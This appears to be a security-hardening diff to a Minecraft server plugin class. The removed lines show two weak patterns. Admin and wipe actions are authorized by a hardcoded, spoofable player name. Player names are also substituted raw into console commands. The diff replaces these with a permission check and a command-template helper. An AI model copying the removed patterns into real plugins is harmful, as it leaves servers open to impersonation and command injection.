@@ -84,7 +84,6 @@ import org.bukkit.plugin.java.JavaPlugin;
 
 public final class IntegratedCoreModuleX {
     private static JavaPlugin plugin;
-    private static final String OWNER = "mtyri";
     /** Shared banner rule used by join/leave and broadcast banners. */
     static final String RULE = "\u00a78\u00a7m----------------------------------------";
 
@@ -150,11 +149,13 @@ public final class IntegratedCoreModuleX {
 
     private static boolean owner(CommandSender commandSender) {
         if (!(commandSender instanceof Player)) {
-            commandSender.sendMessage("\u00a7cOnly mtyri can use this command in-game.");
+            commandSender.sendMessage("\u00a7cOnly staff can use this command in-game.");
             return false;
         }
-        if (!OWNER.equalsIgnoreCase(((Player)commandSender).getName())) {
-            commandSender.sendMessage("\u00a7cOnly mtyri can use this.");
+        // Was a hardcoded username. Names are spoofable on offline-mode and
+        // misconfigured-proxy servers, so the permission node is the gate.
+        if (!((Player) commandSender).hasPermission("gildedcore.admin")) {
+            commandSender.sendMessage("\u00a7cOnly admins can use this.");
             return false;
         }
         return true;
@@ -455,7 +456,7 @@ public final class IntegratedCoreModuleX {
             if (title.startsWith(CONFIRM_TITLE_PREFIX)) {
                 inventoryClickEvent.setCancelled(true);
                 Player player = (Player)humanEntity;
-                if (!IntegratedCoreModuleX.OWNER.equalsIgnoreCase(player.getName())) {
+                if (!player.hasPermission("gildedcore.admin")) {
                     return;
                 }
                 PendingWipe pending = this.pendingConfirms.remove(player.getUniqueId());
@@ -476,7 +477,7 @@ public final class IntegratedCoreModuleX {
             }
             inventoryClickEvent.setCancelled(true);
             Player player = (Player)humanEntity;
-            if (!IntegratedCoreModuleX.OWNER.equalsIgnoreCase(player.getName())) {
+            if (!player.hasPermission("gildedcore.admin")) {
                 return;
             }
             String targetName = this.guiTargets.get(player.getUniqueId().toString());
@@ -526,7 +527,7 @@ public final class IntegratedCoreModuleX {
                 this.resetStats(player);
             }
             for (String rawCommand : cat.getStringList("commands")) {
-                this.dispatch(rawCommand.replace("%player%", targetName).replace("%PLAYER%", targetName));
+                this.dispatch(CommandTemplate.expand(rawCommand, targetName));
             }
         }
 
